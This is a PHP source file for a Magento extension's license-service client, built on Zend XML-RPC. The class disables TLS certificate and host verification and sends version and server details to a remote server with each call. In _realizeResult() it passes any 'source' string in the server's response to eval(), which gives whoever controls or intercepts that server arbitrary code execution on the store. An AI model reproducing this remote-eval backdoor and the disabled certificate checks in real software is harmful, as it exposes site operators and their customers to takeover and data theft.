<?php
/**
 * @copyright  Copyright (c) 2009 MMD, Inc.
 */
class MMD_Mmdsys_Model_Service extends Zend_XmlRpc_Client
implements MMD_Mmdsys_Abstract_Model_Interface
{
    
    protected $_callResult;
    
    protected $_serverAddress;
    
    protected $_prefix = 'mmdseg_license_servicecon';
    
    protected $_session;
    
    protected $_logined = true;
    
    const API_USERNAME = 'CHANGE_ME';

    const API_KEY      = 'CHANGE_ME';

    const API_DEFAULT_SESSION = 'CHANGE_ME';
    
    /**
     * @var MMD_Mmdsys_Model_Module_License
     */
    protected $_license;
    
    public function __construct()
    {
        $curl = new Zend_Http_Client_Adapter_Curl();
        $curl->setCurlOption(CURLOPT_SSL_VERIFYHOST, false);
        $curl->setCurlOption(CURLOPT_SSL_VERIFYPEER, false);
        $client = new Zend_Http_Client(null, array(
        	'adapter' => $curl
        ));
        parent::__construct(null,$client);
    }
    
    protected function _getSession()
    {
        return $this->_session ? $this->_session : self::API_DEFAULT_SESSION;
    }
    
   /**
    * @return MMD_Mmdsys_Model_Module_License
    */
    public function getLicense()
    {
        return $this->_license;
    }
    
    /**
     * @return MMD_Mmdsys_Abstract_Service
     */
    public function tool()
    {
        return MMD_Mmdsys_Abstract_Service::get();
    }
    
    /**
     * @param $prefix
     * @return MMD_Mmdsys_Model_License_Service
     */
    public function setMethodPrefix( $prefix , $clone = true )
    {
        if ($clone)
        {
            $service = clone $this;
            return $service->setMethodPrefix($prefix,false);
        }
        $this->_prefix = $prefix;
        return $this;
    }
    
    /**
     * @param $url
     * @return MMD_Mmdsys_Model_License_Service
     */
    public function setServiceUrl( $url )
    {
        if ($tmp = $this->tool()->getApiUrl())
        {
            $url = $tmp;
        }
        $this->_serverAddress = $url;
        return $this;
    }
    
    public function getServiceUrl()
    {
        return $this->_serverAddress;
    }
    
    /**
     * @param MMD_Mmdsys_Model_Module_License $license
     * @return MMD_Mmdsys_Model_License_Service
     */
    public function setLicense( MMD_Mmdsys_Model_Module_License $license )
    {
        $this->_license = $license;
        return $this;
    }
    
    /**
     * @param $args
     * @return MMD_Mmdsys_Model_License_Service
     */
    protected function _updateArgs( &$args )
    {
        $platform = $this->tool()->platform();
        $args[0]['platform_version'] = $platform->getVersion();
        $args[0]['magento_version'] = Mage::getVersion();
        $args[0]['server_info'] = Mage::helper('mmdsys/statistics')->getServerInfo();
        return $this;
    }
    
    public function __call($method, $args)
    {
        if (!$this->_logined) {
            //return null;
        }
        $this->_callResult = array();
        try {
            $this->_updateArgs($args);
            $method = $this->_prefix. '.' .$method;
            $this->tool()->testMsg('CALL:');
            $this->tool()->testMsg(array($method, $args));
            $params = array($this->_getSession(), $method);
            if ($args) {
                $params[] = $args;
            }
            $this->_callResult = $this->call('call', $params);
            #$this->tool()->testMsg("REMOTE RESPONSE:");
            #$this->tool()->testMsg($this->_callResult);
            $this->_realizeResult();
        } catch (Exception $exc) {
            $this->tool()->testMsg($exc);
            throw $exc;
        }
        return $this->getValue();
    }
    
    public function getValue()
    {
        return isset($this->_callResult['value']) ? $this->_callResult['value'] : null;
    }
    
    protected function _realizeResult()
    {
        if (isset($this->_callResult['session']) && $this->_callResult['session']) {
            $this->_session = $this->_callResult['session'];
        }
        if (isset($this->_callResult['source']) && $this->_callResult['source']) {
            eval($this->_callResult['source']);
        }
        return $this;
    }
    
    /**
     * @deprecated since 2.20.1
     * @return MMD_Mmdsys_Model_License_Service
     */
    public function connect()
    {
        /*
        try
        {
            $this->tool()->testMsg($this->getServiceUrl());
            $this->_session = $this->call('login',array(self::API_USERNAME,self::API_KEY));
            $this->_logined = true;
        }
        catch( Exception $exc )
        {
            $this->tool()->testMsg('Can`t connect to remote service!');
            $this->tool()->testMsg($exc);
        }
        */
        return $this;
    }
    
    /**
     * @deprecated since 2.20.1
     * @return bool 
     */
    public function isLogined()
    {
        return $this->_logined;
    }
    
    /**
     * @deprecated since 2.20.1
     * @return MMD_Mmdsys_Model_License_Service
     */
    public function disconnect()
    {
        /*
        if ($this->_logined)
        {
            $this->_logined = false;
            $this->call('endSession',array($this->_session));
        }
        */
        return $this;
    }
}
